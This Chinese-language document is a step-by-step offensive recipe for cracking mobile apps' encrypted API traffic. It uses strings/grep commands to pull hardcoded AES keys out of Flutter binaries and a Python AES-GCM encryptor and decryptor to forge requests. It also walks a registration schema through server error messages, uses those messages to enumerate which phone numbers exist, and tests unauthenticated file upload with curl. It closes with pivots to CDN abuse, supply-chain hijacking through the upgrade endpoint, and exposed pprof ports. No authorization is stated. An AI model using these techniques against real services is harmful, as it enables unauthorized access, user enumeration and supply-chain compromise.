# AES/GCM 报文加密破解配方（命令级）

## 1. 找 key

```bash
# Flutter AOT：类名与常量都还在
strings -n 6 lib/arm64-v8a/libapp.so | grep -iE 'encrypt|decrypt|aes|gcm|cbc|ecb|interceptor|secret|nonce'
# 32 字符 ASCII 候选（AES-256）
strings -n 32 lib/arm64-v8a/libapp.so | grep -xE '[ -~]{32}'
# 64 字符 hex（=32 字节）
strings -n 64 lib/arm64-v8a/libapp.so | grep -xE '[0-9a-fA-F]{64}'
# 真实路由前缀
strings lib/arm64-v8a/libapp.so | grep -E '^/[a-zA-Z][a-zA-Z0-9_/-]{2,40}$' | sort -u
```

其他位置：`assets/flutter_assets/`（config json、baseURL、开关）、除 libapp 外所有 `.so`、
React Native 的 `index.android.bundle`、原生 `classes.dex` 的 `strings`。

判断哪个 32 字符常量是 key：它出现在 `*EncryptionInterceptor` / `*EncryptedRequest` 附近，
或与 `AES/GCM/SecretKeySpec` 同段。**key 就是这 32 个 ASCII 字节本身**，先按原文试，不要先 hex 解码。

## 2. 长度 → 模式判定表

取一个真实响应，base64 解码后长度 `L`：

| 结构 | 判定 | 明文长度 |
|---|---|---|
| `L = 12 + n + 16`，L 通常不是 16 的倍数 | AES-GCM（nonce 12 / tag 16） | `L - 28` |
| `L % 16 == 0`，无独立 nonce | ECB 或 CBC（IV 可能固定/前置） | 填充后 |
| 前 16B 随机、其余 `%16==0` | CBC，IV 前置 | `L - 16 - pad` |
| `L % 8 == 0` 且密文短 | DES/3DES 老系统 | — |
| `L % 16 != 0` 且不满足 12+16 | 可能 base64 里还有一层（URL-encode/JSON-in-JSON） | — |

样例：91 字节 = 12 + 63 + 16 → GCM，明文 63 字节 → `{"errCode":500,"errMsg":"用户信息不能为空","errDlt":""}`。

## 3. 加解密器

```python
import base64, os, json
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

K = b'<32-char ascii>'          # 原文 ASCII，不是 hex

def dec(b64: str) -> str:
    ct = base64.b64decode(b64)
    return AESGCM(K).decrypt(ct[:12], ct[12:], None).decode('utf-8', 'replace')

def enc(obj_or_str) -> dict:    # 请求体包装
    pt = obj_or_str.encode() if isinstance(obj_or_str, str) else json.dumps(obj_or_str).encode()
    n = os.urandom(12)
    return {"data": base64.b64encode(n + AESGCM(K).encrypt(n, pt, None)).decode()}
```

- 响应外层通常是 `{"data": "<base64>"}`，直接解 `data`。
- 请求只有在报 `encrypted data is required` 时才包；先试明文。
- 若解密抛 `InvalidTag`：key 错、或模式不是 GCM（回去看长度）、或 nonce 长度不是 12（试 16，tag 仍取末 16）。

## 4. schema 走查（错误信息驱动）

每轮只改一处，记录服务端下一条报错：

1. `{}` → `用户信息不能为空`（顶层 `user` 对象缺失）
2. `{"user":{}}` → `密码长度不能少于8位`（`password` 在 **user 内**，不是顶层）
3. 补密码 → `注册邀请码不能为空`（`user.inviteCode`；内容可能只校验非空，`888888` 即过）
4. 补邀请码 → `设备号不能为空` → **`deviceID` 在 header**，body 里怎么塞都无效
5. 加 header 后 `errCode:0` → 但别高兴，下一步验证

同类差异报错即预言机：`用户不存在` vs `用户密保问题不存在` = 手机号存在性枚举。

## 5. 假成功验证（必须做）

```python
# 1) 同凭证登录
POST /account/login  {phone, password}   -> "用户不存在" = 没落库
# 2) 存在性查询
POST /account/findByPhone {phone}        -> "用户不存在"
# 3) 受 token 保护接口
POST /user/current   header token: <chatToken>  -> 1505 TokenUnknownError
```

三个都不认 ⇒ 注册是 stub：token 签名有效但身份不存在。**不要**拿这个 token 当「已拿到账号」写进报告。
若返回的 userID 是服务端随机分配、且传 `user.userID`/`uid` 被忽略 ⇒ 抢注特权 UID 不可行，早停。

## 6. 写原语回读

```bash
# 未授权上传
curl -sk -F 'file=@/tmp/v.png' https://<host>/openChat/common/upload/image
# → {"object_name":"chat_image/2026/10/20/<id>.png","url":"https://cdn...?Signature=..."}
curl -sk -o /tmp/dl.png -w '%{http_code} %{size_download} %{content_type}' -L '<url>'
# 期望 200 + image/png；再验文件头 \x89PNG
```

只回 200 不够：`200 image/png` + 正确 magic bytes 才算写入成立。存储桶读 ACL 同理要看 XML 内容里的
`AllUsers: READ`（可读 ≠ 可写，PUT 常是 405）。

## 7. 打不通时的下一跳

- 这些接口经常一并免鉴权：`common/config`、`home/config`、`getAppUpgrade`、`account/captcha`、`upload/image`。
  配置里常有系统 UID、内部群组 ID、客服域名、下载域名、验证码开关（`login_captcha_enabled:false`）。
- 身份拿不到而写原语拿到：转向存储/CDN 滥用、供应链（版本接口改下载地址）、边缘调试口（pprof）。
- 别继续爆 JWT：token 由独立集群签发时，主站 secret 无关。
